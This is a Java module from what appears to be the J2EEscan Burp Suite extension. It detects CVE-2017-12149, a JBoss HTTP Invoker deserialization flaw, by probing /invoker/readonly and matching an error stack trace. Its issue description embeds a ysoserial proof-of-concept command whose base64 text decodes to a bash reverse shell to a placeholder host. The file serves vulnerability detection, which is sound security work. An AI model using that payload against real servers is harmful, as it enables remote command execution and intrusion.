package burp.j2ee.issues.impl;

import burp.j2ee.CustomScanIssue;
import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.Risk;
import burp.j2ee.annotation.RunOnlyOnce;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;

/**
 * The doFilter method in the ReadOnlyAccessFilter of the HTTP Invoker does not
 * restrict classes for which it performs deserialization.
 *
 * This allows an attacker to execute arbitrary code via crafted serialized
 * data.
 *
 * References:
 *  - https://access.redhat.com/security/cve/cve-2017-12149
 *
 *
 */
public class JBossJMXReadOnly implements IModule {

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private static final String TITLE_JMXINVOKER_UNPROTECTED = "HTTPInvoker ReadOnlyAccessFilter- Remote Command Execution";
    private static final String DESCRIPTION_JMXINVOKER_UNPROTECTED = "J2EEscan identified a remote command execution. <br />"
            + "The doFilter method in the ReadOnlyAccessFilter of the HTTP Invoker does not restrict classes for which "
            + "it performs deserialization. This allows an attacker to execute arbitrary code via crafted serialized data.<br /><br />."
            + "Proof of concept using <i>ysoserial.jar</i><br />"
            + "<pre>java -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}\" > poc.ser</pre><br />"
            + "<b>References:</b><br /><br />"
            + "https://access.redhat.com/security/cve/cve-2017-12149<br />";

    private static final String REMEDY = "Disable or restrict access to the Invoker Servlet";

    private static final List<String> JBOSS_INVOKER_PATHS = Arrays.asList(
            "/invoker/readonly"
    );

    // TODO improve check do avoid false negatives when full stacktrace is correctly handled
    /**
     * HTTP/1.1 500 Internal Server Error
        Server: Apache-Coyote/1.1
        Content-Type: text/html;charset=utf-8
        Content-Length: 1572
        Date: Sun, 18 Feb 2018 18:56:05 GMT
        Connection: close

        <html><head><title>JBoss Web/3.0.0-CR2 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Exception report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>The server encountered an internal error () that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>java.io.EOFException
                java.io.ObjectInputStream$PeekInputStream.readFully(ObjectInputStream.java:2303)
                java.io.ObjectInputStream$BlockDataInputStream.readShort(ObjectInputStream.java:2772)
                java.io.ObjectInputStream.readStreamHeader(ObjectInputStream.java:778)
                java.io.ObjectInputStream.&lt;init&gt;(ObjectInputStream.java:278)
                org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:102)
        </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the JBoss Web/3.0.0-CR2 logs.</u></p><HR size="1" noshade="noshade"><h3>JBoss Web/3.0.0-CR2</h3></body></html>
     * 
     * 
     */
    private static final byte[] GREP_STRING = "org.jboss.invocation.http.servlet.ReadOnlyAccessFilter".getBytes();

    private PrintWriter stderr;

    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String JBOSS_INVOKER_PATH : JBOSS_INVOKER_PATHS) {

                try {

                    URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), JBOSS_INVOKER_PATH);
                    byte[] jbosstest = helpers.buildHttpRequest(urlToTest);

                    byte[] response = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, jbosstest);

                    IResponseInfo jbossInvokerInfo = helpers.analyzeResponse(response);

                    // look for matches of our active check grep string
                    List<int[]> matcheInvoker = getMatches(response, GREP_STRING, helpers);

                    if (matcheInvoker.size() > 0) {

                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                new URL(protocol, url.getHost(), url.getPort(), JBOSS_INVOKER_PATH),
                                new CustomHttpRequestResponse(jbosstest, response, baseRequestResponse.getHttpService()),
                                TITLE_JMXINVOKER_UNPROTECTED,
                                DESCRIPTION_JMXINVOKER_UNPROTECTED,
                                REMEDY,
                                Risk.High,
                                Confidence.Certain
                        ));

                        return issues;
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }
            }
        }

        return issues;
    }

}
